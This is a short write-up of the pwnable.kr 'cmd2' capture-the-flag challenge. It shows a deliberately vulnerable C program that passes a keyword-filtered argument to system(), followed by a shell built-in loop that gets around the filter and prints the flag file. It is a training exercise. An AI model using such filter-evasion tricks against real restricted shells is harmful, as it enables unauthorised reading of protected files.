---
title: Cmd2 - Pwnable.kr
date: 2016-01-17
categories: [Writeups, Pwnable.kr]
tags: ['Bash', 'Escape restricted env']
image:
    path: "/unsorted/pwnablekr.png"

---

Another challenge where we need to escape from a restricted situation. This
time we have complete control on the argument passed the function `system` but,
just to make sure we will not do anything harmful, the content of the
environment is deleted and the content of the argument passed to `system`
filtered.


```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "=")!=0;
        r += strstr(cmd, "PATH")!=0;
        r += strstr(cmd, "export")!=0;
        r += strstr(cmd, "/")!=0;
        r += strstr(cmd, "`")!=0;
        r += strstr(cmd, "flag")!=0;
        return r;
}

extern char** environ;
void delete_env(){
        char** p;
        for(p=environ; *p; p++) memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
        delete_env();
        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
        if(filter(argv[1])) return 0;
        printf("%s\n", argv[1]);
        system( argv[1] );
        return 0;
}
```



So, how do we make this program open the file flag in our working directory?
We cannot have access to any program, but there is still a class of commands
that we can use!  The built-in commands (as they don’t use the value of PATH).
This is an fast and dirty example, it allows us to read the first line of flag
but I’m sure you can do a lot better and pawn a shell:

    
```text
cmd2@ubuntu:~$ ./cmd2 'for file in *
> do
> read line < $file
> echo $line
> done';
ELF>@@p@8 @@@@@@��88@8@@@
#include <stdio.h>
FuN_****_*****_*****_haha	<---- That's the flag!
```

